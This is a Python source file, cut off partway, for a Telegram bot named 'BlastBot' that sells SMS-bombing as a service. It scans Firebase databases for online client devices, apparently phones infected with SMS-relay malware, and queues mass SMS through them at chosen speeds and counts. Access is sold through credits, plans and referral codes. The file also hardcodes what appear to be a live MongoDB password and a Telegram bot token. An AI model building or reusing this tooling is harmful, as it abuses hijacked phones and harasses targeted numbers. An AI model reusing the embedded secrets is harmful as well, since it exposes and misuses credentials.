import asyncio, json, os, time, logging, random, string, uuid
from datetime import datetime
from copy import deepcopy

import aiohttp
from motor.motor_asyncio import AsyncIOMotorClient
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ================= MONGODB CONFIG =================
MONGO_URI = "mongodb+srv://gogo_db_user:4DfbHqcjpjg6TYb8@firebase.snn8z2u.mongodb.net"
MONGO_DB_NAME = "olympic"
MONGO_COLLECTION = "bot_state"
MONGO_DOC_ID = "main"

_mongo_client = None
_mongo_col = None
_DATA_CACHE = {}
_MONGO_LOCK = asyncio.Lock()
_SAVE_QUEUE = None
_SAVE_WORKER_TASK = None

async def init_mongo():
    global _mongo_client, _mongo_col, _SAVE_QUEUE, _SAVE_WORKER_TASK
    try:
        _mongo_client = AsyncIOMotorClient(
            MONGO_URI,
            serverSelectionTimeoutMS=15000,
            connectTimeoutMS=15000,
            retryWrites=True
        )
        _mongo_col = _mongo_client[MONGO_DB_NAME][MONGO_COLLECTION]
        await _mongo_client.admin.command("ping")
        log.info(f"✅ MongoDB connected: {MONGO_DB_NAME}.{MONGO_COLLECTION}")

        # Load existing data
        doc = await _mongo_col.find_one({"_id": MONGO_DOC_ID})
        if doc:
            doc.pop("_id", None)
            default = _default_data()
            for k, v in default.items():
                if k not in doc:
                    doc[k] = v
            if MAIN_OWNER not in doc.get("owners", []):
                doc["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in doc.get("users", {}).items():
                u.setdefault("credits", 0)
                u.setdefault("sms_history", [])
            doc.setdefault("settings", {}).setdefault("max_admins", 20)
            doc.setdefault("settings", {}).setdefault("auto_cleanup", True)
            _DATA_CACHE.clear()
            _DATA_CACHE.update(doc)
            log.info(f"📥 Loaded: {len(doc.get('users', {}))} users, {len(doc.get('firebases', []))} fbs")
        else:
            default = _default_data()
            await _write_mongo(default)
            _DATA_CACHE.clear()
            _DATA_CACHE.update(default)
            log.info("📝 Fresh state created in MongoDB")

        # Start save worker for FIFO ordering
        _SAVE_QUEUE = asyncio.Queue()
        _SAVE_WORKER_TASK = asyncio.create_task(_save_worker())
        log.info("💾 Save worker started")
    except Exception as e:
        log.error(f"❌ MongoDB init failed: {e}")
        raise

async def _write_mongo(d: dict):
    try:
        d_copy = deepcopy(d)
        await _mongo_col.update_one(
            {"_id": MONGO_DOC_ID},
            {"$set": d_copy},
            upsert=True
        )
    except Exception as e:
        log.error(f"MongoDB write fail: {e}")

async def _save_worker():
    while True:
        try:
            d = await _SAVE_QUEUE.get()
            async with _MONGO_LOCK:
                await _write_mongo(d)
            _SAVE_QUEUE.task_done()
        except asyncio.CancelledError:
            break
        except Exception as e:
            log.error(f"Save worker: {e}")

def load() -> dict:
    if not _DATA_CACHE:
        return _default_data()
    return deepcopy(_DATA_CACHE)

def save(d: dict):
    _DATA_CACHE.clear()
    _DATA_CACHE.update(deepcopy(d))
    try:
        if _SAVE_QUEUE is not None:
            _SAVE_QUEUE.put_nowait(deepcopy(d))
    except Exception as e:
        log.error(f"Save queue fail: {e}")

async def safe_save(d: dict):
    _DATA_CACHE.clear()
    _DATA_CACHE.update(deepcopy(d))
    async with _MONGO_LOCK:
        await _write_mongo(d)

async def reload_cache():
    doc = await _mongo_col.find_one({"_id": MONGO_DOC_ID})
    if doc:
        doc.pop("_id", None)
        _DATA_CACHE.clear()
        _DATA_CACHE.update(doc)

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_TRASH = "5231012360643342592"
EMOJI_DIAMOND = "5427168083074628963"
EMOJI_BOLT = "5217822164362739968"
FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(text=label, callback_data=callback_data, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, callback_data=callback_data)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, url=url)

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

# ========== OWNER CONFIG ==========
MAIN_OWNER = 8617986101
OWNER_NAME = "Roronoazero"
SUPER_ADMIN_NAME = "Roronoazero"
SUPER_ADMIN_LINK = "https://t.me/Roronoazero1"
SUPER_ADMINS = [8617986101]

BOT_TOKEN = "8940033297:AAHSUj6OgWX3U7QqUmbCiFmmeLM-YgSexb4"
LOG_CHANNEL_ID = -1003929619180

_VERSION = "𝗩4 ᴍᴏɴɢᴏ ᴘʀᴇᴍɪᴜᴍ"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 90.0

_FB_BATCH_SIZE = 10
_FB_CONCURRENT_SCAN = 5
_FB_PER_FB_TIMEOUT = 6
_FB_DEVICE_TIMEOUT = 5
_FB_MAX_DEVICES_PER_DB = 200
_FB_AUTO_DELETE_THRESHOLD = 3

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

# ========== STATES ==========
class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_owner_force = State()
    add_admin = State()
    add_admin_bulk = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    set_max_admins = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()

# ========== USER SESSIONS ==========
class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']
    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

FB_FAIL_COUNT = {}
AUTO_CLEANUP_ENABLED = True
LAST_CLEANUP_TIME = 0
LAST_CLEANUP_REMOVED = 0

# ========== DEFAULT DATA ==========
def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {
            "ref_credits": 3,
            "max_owners": 6,
            "max_admins": 20,
            "auto_cleanup": True
        },
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "role_meta": {},
        "videos": []
    }

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

# ========== ROLE CHECKS ==========
def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d): return False
    if is_admin(uid, d): return True
    if d.get("free_mode"): return True
    if uid in d.get("approved", []): return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

# ========== CREDITS ==========
def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "credits": 0, "name": "Unknown", "uses": 0,
            "joined_at": int(time.time()), "sms_history": []
        }
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

# ========== REFERRAL ==========
def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if not any(u.get("refer_code") == code for u in d.get("users", {}).values()):
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

# ========== UI HELPERS ==========
def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0: return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4: return number
    return number[:2] + "******" + number[-4:]

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60: return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    cnt = len(CACHED_DEVICES)
    dt = time.time() - LAST_SCAN_TIME
    if dt < 120: return f"{em(EMOJI_CHECK, '🟢')} {cnt} ᴅᴇᴠɪᴄᴇs"
    elif dt < 600: return f"{em(EMOJI_WARNING, '🟡')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(dt/60)}ᴍ)"
    return f"{em(EMOJI_CROSS, '🔴')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(dt/60)}ᴍ)"

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire effect: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Channel log fail: {e}")

# ========== FIREBASE ==========
async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=_FB_PER_FB_TIMEOUT)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception as e:
        log.debug(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300: return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs: return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    _fb_sem = asyncio.Semaphore(_FB_CONCURRENT_SCAN)

    async def fetch_one(fb: dict):
        async with _fb_sem:
            shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=_FB_PER_FB_TIMEOUT)) as r:
                        if r.status != 200: return
                        txt = (await r.text()).strip()
                        if txt == "null" or not txt: return
                        device_ids = json.loads(txt)
                        if not isinstance(device_ids, dict): return
                        dev_ids = list(device_ids.keys())[:_FB_MAX_DEVICES_PER_DB]
                        _dev_sem = asyncio.Semaphore(5)

                        async def fetch_dev(dev_id: str):
                            async with _dev_sem:
                                try:
                                    url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                                    async with s.get(url, timeout=aiohttp.ClientTimeout(total=_FB_DEVICE_TIMEOUT)) as r2:
                                        if r2.status == 200:
                                            txt2 = (await r2.text()).strip()
                                            if txt2 == "null" or not txt2: return None
                                            dev_data = json.loads(txt2)
                                            if isinstance(dev_data, dict) and device_is_online(dev_data):
                                                name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                                return {
                                                    "fb_id": fb["id"], "fb_url": fb["url"],
                                                    "fb_label": fb.get("label", fb["url"][:30]),
                                                    "dev_id": dev_id, "dev_name": name,
                                                    "sims": dev_data.get("sims", []),
                                                }
                                except Exception: pass
                                return None

                        for i in range(0, len(dev_ids), 10):
                            batch = dev_ids[i:i+10]
                            dev_results = await asyncio.gather(*[fetch_dev(x) for x in batch], return_exceptions=True)
                            for res in dev_results:
                                if res and isinstance(res, dict):
                                    results.append(res)
            except Exception as e:
                log.debug(f"fb scan {fb['url']}: {e}")

    for i in range(0, len(fbs), _FB_BATCH_SIZE):
        batch = fbs[i:i+_FB_BATCH_SIZE]
        log.info(f"[SCAN] Batch {i//_FB_BATCH_SIZE + 1}/{(len(fbs) + _FB_BATCH_SIZE - 1)//_FB_BATCH_SIZE}")
        await asyncio.gather(*[fetch_one(fb) for fb in batch], return_exceptions=True)
        await asyncio.sleep(0.5)

    log.info(f"[SCAN] {len(results)} online devices from {len(fbs)} DBs")
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(fb_url, f"/clients/{dev_id}/webhookEvent/sendSms.json", {
        "from": sim_slot, "to": to.strip(), "message": message.strip(),
        "isSended": False, "timestamp": int(time.time())
    })

# ========== BACKGROUND SCANNER + AUTO-CLEANUP ==========
async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG
    global FB_FAIL_COUNT, LAST_CLEANUP_TIME, LAST_CLEANUP_REMOVED, AUTO_CLEANUP_ENABLED
    log.info("Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5); continue
            SCANNING_IN_PROGRESS = True
        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
        start_scan = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ᴅʙs"
                CACHED_DEVICES = []
                async with SCAN_LOCK: SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL); continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan
            CACHED_DEVICES = devices
            new_fb_counts = {}
            to_delete = []

            for fb in fbs:
                fb_id = fb["id"]
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                new_fb_counts[fb_id] = {
                    "label": fb.get("label", fb["url"][:30]),
                    "online": fb_online,
                    "last_update": int(time.time())
                }
                if fb_online == 0:
                    FB_FAIL_COUNT[fb_id] = FB_FAIL_COUNT.get(fb_id, 0) + 1
                    if FB_FAIL_COUNT[fb_id] >= _FB_AUTO_DELETE_THRESHOLD and AUTO_CLEANUP_ENABLED:
                        to_delete.append(fb)
                else:
                    FB_FAIL_COUNT[fb_id] = 0

            FB_DEVICE_COUNTS.clear()
            FB_DEVICE_COUNTS.update(new_fb_counts)
            LAST_SCAN_TIME = time.time()

            if to_delete:
                d_fresh = load()
                removed_labels = []
                for dead_fb in to_delete:
                    d_fresh["firebases"] = [f for f in d_fresh.get("firebases", []) if f["id"] != dead_fb["id"]]
                    FB_FAIL_COUNT.pop(dead_fb["id"], None)
                    FB_DEVICE_COUNTS.pop(dead_fb["id"], None)
                    removed_labels.append(dead_fb.get("label", dead_fb["url"][:30]))
                await safe_save(d_fresh)
                LAST_CLEANUP_TIME = int(time.time())
                LAST_CLEANUP_REMOVED = len(removed_labels)
                log.info(f"[AUTO-CLEANUP] Removed {len(removed_labels)} dead fbs")
                if removed_labels:
                    try:
                        notify_text = (
                            f"{em(EMOJI_TRASH, '🗑')} <b>Auto-Cleanup Report</b>\n\n"
                            f"{em(EMOJI_FIRE, '🔥')} <b>{len(removed_labels)}</b> dead firebases removed\n"
                            f"<i>(3 consecutive scans me 0 devices the)</i>\n\n")
                        for lbl in removed_labels[:10]:
                            notify_text += f"  • <code>{lbl}</code>\n"
                        if len(removed_labels) > 10:
                            notify_text += f"  <i>+{len(removed_labels)-10} more</i>"
                        notify_text += f"\n\n{em(EMOJI_CHECK, '📊')} Remaining DBs: <b>{len(d_fresh.get('firebases', []))}</b>"
                        await bot.send_message(MAIN_OWNER, notify_text, parse_mode="HTML")
                    except Exception as e:
                        log.warning(f"Cleanup notify: {e}")

            DEVICE_HEALTH_LOG.append({
                "timestamp": int(time.time()), "devices_found": len(devices),
                "dbs_scanned": len(fbs), "duration_sec": round(scan_duration, 2)
            })
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs"
                if not first_scan_done:
                    try:
                        await bot.send_message(MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} {scan_duration:.1f}s",
                            parse_mode="HTML")
                    except: pass
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ"
            log.error(f"[BG-SCAN] {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

# ========== FORCE JOIN ==========
async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force join check {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
    if is_owner(uid, d): return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False): return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ========== TEXT GENERATORS ==========
def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    auto_clean = "🟢 ON" if AUTO_CLEANUP_ENABLED else "🔴 OFF"

    sorted_fbs = sorted(FB_DEVICE_COUNTS.items(), key=lambda x: x[1]["online"], reverse=True)[:5]
    fb_lines = []
    for fb_id, fb_data in sorted_fbs:
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 120 else em(EMOJI_WARNING, "🟡") if age < 600 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:18]}: {fb_data['online']}")
    if len(FB_DEVICE_COUNTS) > 5:
        fb_lines.append(f"  <i>+{len(FB_DEVICE_COUNTS)-5} more</i>")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"{em(EMOJI_DIAMOND, '💎')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"╔══════════════════╗\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
